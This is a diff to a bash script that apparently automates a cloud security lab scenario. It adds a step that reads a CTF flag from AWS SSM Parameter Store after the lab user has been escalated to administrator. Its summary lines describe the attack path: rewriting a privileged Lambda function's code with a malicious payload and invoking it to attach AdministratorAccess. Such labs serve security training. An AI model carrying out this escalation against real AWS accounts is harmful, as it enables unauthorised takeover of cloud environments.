@@ -343,12 +343,29 @@ echo ""
 # Clean up temporary files (keep backup for cleanup script)
 rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json
 
+# [EXPLOIT] Step 14: Capture the CTF flag
+# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
+use_starting_creds
+echo -e "${YELLOW}Step 14: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/lambda-003-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 # Summary
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (with lambda:UpdateFunctionCode + lambda:InvokeFunction)"
@@ -357,11 +374,13 @@ echo "3. Lambda function has privileged execution role: $TARGET_ROLE"
 echo "4. Updated Lambda function code with malicious payload"
 echo "5. Invoked Lambda function to attach AdministratorAccess to our user"
 echo "6. Achieved: Administrator Access"
+echo "7. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (lambda:UpdateFunctionCode) → $TARGET_LAMBDA"
 echo -e "  → (lambda:InvokeFunction) → Executes with $TARGET_ROLE"
 echo -e "  → (iam:AttachUserPolicy) → AdministratorAccess → Admin"
+echo -e "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
